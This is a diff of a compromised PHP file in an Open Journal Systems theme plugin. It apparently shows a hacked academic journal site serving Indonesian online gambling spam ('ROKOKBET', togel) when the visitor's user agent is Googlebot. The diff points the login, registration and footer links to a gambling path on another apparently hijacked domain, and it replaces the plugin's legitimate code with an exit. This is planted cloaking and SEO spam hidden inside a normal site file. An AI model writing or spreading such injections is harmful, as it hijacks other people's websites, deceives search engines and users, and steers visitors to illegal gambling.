@@ -14,9 +14,9 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 <meta name="title" content="ROKOKBET ✈️ Situs Tier Atas Dengan Togel Online - AUTO CUAN">
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://paauascience.com.ng/">
-<link rel="amphtml" href="https://mobile.situsrokokbet.org/">
-<link rel="alternate" hreflang="id-id" href="https://mobile.situsrokokbet.org/">
-<link rel="alternate" hreflang="id" href="https://mobile.situsrokokbet.org/">
+<link rel="amphtml" href="https://poltekkesmedankab.com/rajarokokbet/">
+<link rel="alternate" hreflang="id-id" href="https://poltekkesmedankab.com/rajarokokbet/">
+<link rel="alternate" hreflang="id" href="https://poltekkesmedankab.com/rajarokokbet/">
 <meta name="publisher" content="ROKOKBET">
 <meta name="description" content="ROKOKBET merupakan situs tier atas dengan togel online terpercaya, akses cepat, dan layanan lengkap untuk pengalaman bermain yang nyaman dan praktis setiap hari.">
 <meta name="keywords" content="ROKOKBET, ROKOKBET, ROKOKBET resmi, ROKOKBET slot, ROKOKBET jitu, ROKOKBET gacor">
@@ -4086,8 +4086,8 @@ digitalData.page.pageInfo.pageName = pageName;
         <!-- CTA Buttons - Gold Version (tanpa animasi slot) -->
         <div class="cta-gold-section">
             <div class="cta-buttons-gold">
-                <a href="https://mobile.situsrokokbet.org/" rel="nofollow noreferrer" class="btn-gold btn-login-gold" title="Masuk akun">LOGIN</a>
-                <a href="https://mobile.situsrokokbet.org/" rel="nofollow noreferrer" class="btn-gold btn-register-gold" title="Daftar sekarang">DAFTAR</a>
+                <a href="https://poltekkesmedankab.com/rajarokokbet/" rel="nofollow noreferrer" class="btn-gold btn-login-gold" title="Masuk akun">LOGIN</a>
+                <a href="https://poltekkesmedankab.com/rajarokokbet/" rel="nofollow noreferrer" class="btn-gold btn-register-gold" title="Daftar sekarang">DAFTAR</a>
             </div>
         </div>
     </div>
@@ -6663,17 +6663,17 @@ digitalData.page.pageInfo.pageName = pageName;
             <div class="footer-category__list-wrap">
               <ul class="footer-category__list" role="list">
                 <li class="footer-category__item" role="listitem">
-                  <a class="footer-category__link" href="https://mobile.situsrokokbet.org/">
+                  <a class="footer-category__link" href="https://poltekkesmedankab.com/rajarokokbet/">
                     Login Member
                   </a>
                 </li>
                 <li class="footer-category__item" role="listitem">
-                  <a class="footer-category__link" href="https://mobile.situsrokokbet.org/">
+                  <a class="footer-category__link" href="https://poltekkesmedankab.com/rajarokokbet/">
                     Daftar Akun Baru
                   </a>
                 </li>
                 <li class="footer-category__item" role="listitem">
-                  <a class="footer-category__link" href="https://mobile.situsrokokbet.org/">
+                  <a class="footer-category__link" href="https://poltekkesmedankab.com/rajarokokbet/">
                     Lupa Password
                   </a>
                 </li>
@@ -11686,8 +11686,8 @@ try{(new g(100,"r","QSI_S_ZN_eWYlZPQdS1JT1sh","https://znewylzpqds1jt1sh-samsung
         <div class="slot">
             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOXe3BUsaLct9qXexQzjQMCr-8H68aZI7c7m9AaEuPV-CMxbJ_YGInqpBFx8Jh5ENx52GlDdven8XkUB9mmlglx-REVLTkSsGsDMZSiT_mxl2ra1ijz4gu04N6poB66yTD1CbmNlrDm_6FUnh9AzVrcD1MHEgxD2I5R2qZVpPTamhNHu1oTQVn_5XFhkE/s1024/aa0d0aba-4fa8-4bfb-9930-b8842282fff4.jpg" alt="Popup Banner" class="popup-image">
             <div class="clk-btn-sgp" style="font-size: 20px;">
-                <a href="https://mobile.situsrokokbet.org/" target="_blank" rel="nofollow noreferrer" class="login">LOGIN</a>
-                <a href="https://mobile.situsrokokbet.org/" target="_blank" rel="nofollow noreferrer" class="register">DAFTAR</a>
+                <a href="https://poltekkesmedankab.com/rajarokokbet/" target="_blank" rel="nofollow noreferrer" class="login">LOGIN</a>
+                <a href="https://poltekkesmedankab.com/rajarokokbet/" target="_blank" rel="nofollow noreferrer" class="register">DAFTAR</a>
             </div>
             <div class="popup-footer">
                 ROKOKBET ✈️ Situs Tier Atas Dengan Togel Online - AUTO CUAN<br>
@@ -12168,18 +12168,6 @@ exit;
 }
 ?>
 <?php
-
-/**
- * @file plugins/themes/default/index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup plugins_themes_default
- *
- * @brief Wrapper for default theme plugin.
- *
- */
-
-return new \APP\plugins\themes\default\DefaultThemePlugin();
+exit;
+}
+?>
